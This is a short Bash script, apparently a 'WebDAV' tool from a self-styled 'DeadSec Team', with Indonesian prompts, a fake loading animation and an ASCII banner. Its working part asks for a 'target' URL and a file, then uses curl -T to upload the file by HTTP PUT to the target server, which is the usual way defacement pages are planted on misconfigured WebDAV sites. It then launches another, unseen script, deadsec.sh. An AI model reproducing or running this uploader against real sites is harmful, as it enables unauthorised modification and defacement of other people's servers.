#!/bin/bash
clear
echo "sedang menjalankan program."
sleep 0.03
clear
echo "sedang menjalankan program.."
sleep 0.03
clear
echo "sedang menjalankan program..."
sleep 0.03
clear
echo "sedang menjalankan program.."
sleep 0.03
clear
echo "sedang menjalankan program."
sleep 0.03
clear
echo "sedang menjalankan program.."
sleep 0.03
clear
echo "sedang menjalankan program..."
sleep 0.03
clear
echo "sedang menjalankan program.."
sleep 1
clear
echo "sedang menjalankan program."
sleep 1
echo 
clear
read -p "masukkan nickname anda: " nm;
clear
echo "selamat datang di tools kami "$nm",mohon tunggu sebentar"
sleep 2
clear
echo "simpel██╗    ██╗███████╗██████╗ ██████╗  █████╗ ██╗   ██╗"
echo "      ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║"
echo "      ██║ █╗ ██║█████╗  ██████╔╝██║  ██║███████║██║   ██║"
echo "      ██║███╗██║██╔══╝  ██╔══██╗██║  ██║██╔══██║╚██╗ ██╔╝"
echo "      ╚███╔███╔╝███████╗██████╔╝██████╔╝██║  ██║ ╚████╔╝" 
echo "       ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═════╝ ╚═╝  ╚═╝  ╚═══╝ by DeadSec Team"
echo ""
echo "\033[31;1mCreated By: Deadsec Team"
echo "\033[31;1mAuthor By : DarkNess"
echo "tetap, pertahankan senyum mu didalam hati yang hancur :)"
echo ""
cd /sdcard
read -p "masukkan url target: " tp;
read -p "masukkan nama filenya: " fp;
curl -T $fp $tp
sleep 1
echo "Succes!"
sleep 2
cd Dssquad
clear
sh deadsec.sh